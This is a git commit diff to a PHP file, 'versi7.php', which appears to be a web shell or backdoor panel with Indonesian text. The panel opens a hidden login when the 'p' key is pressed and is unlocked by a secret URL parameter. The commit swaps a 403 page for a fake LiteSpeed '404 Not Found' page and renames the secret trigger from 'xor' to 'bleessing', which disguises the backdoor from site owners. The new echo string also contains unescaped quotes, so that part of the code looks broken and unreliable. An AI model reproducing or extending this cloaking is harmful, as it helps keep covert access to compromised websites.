bc62426f68d0d9ca489c141dad6b53a97380d90e
b3l13v3x666 <me.b3l13v3@gmail.com>
2026-01-25 01:33:58 +0700

    Update versi7.php

--- versi7.php
+++ versi7.php
@@ -29,17 +29,19 @@ if (isset($_GET['keluar'])) {
     }
 if (!isset($_SESSION['logged_in'])):
     http_response_code(403);
-    echo "<!DOCTYPE html>
-<html>
+    echo "<html style="height:100%">
 <head>
-    <title>403 Forbidden</title>
-</head>
-<body>
-    <h1>403 Forbidden</h1>
-    <p>Anda tidak memiliki izin untuk mengakses halaman ini.</p>
-</body>
-</html>";
-    if (isset($_GET['xor'])) {
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<title> 404 Not Found
+</title><style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style></head>
+<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
+<div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
+<h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">404</h1>
+<h2 style="margin-top:20px;font-size: 30px;">Not Found
+</h2>
+<p>The resource requested could not be found on this server!</p>
+<br>Proudly powered by LiteSpeed Web Server<p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div></body></html>";
+    if (isset($_GET['bleessing'])) {
 echo '
 <!DOCTYPE html>
 <html lang="id">
@@ -72,7 +74,7 @@ echo '
 </head>
 <script>
 document.addEventListener("keydown", function(event) {
-    if (event.key === "p" || event.key === "P") {
+        if (event.key === "p" || event.key === "P") {
         document.getElementById("loginModal").style.display = "flex";
     }
 });
@@ -1250,3 +1252,4 @@ document.addEventListener('DOMContentLoaded', () => {
 </script>
 </body>
 </html>
+
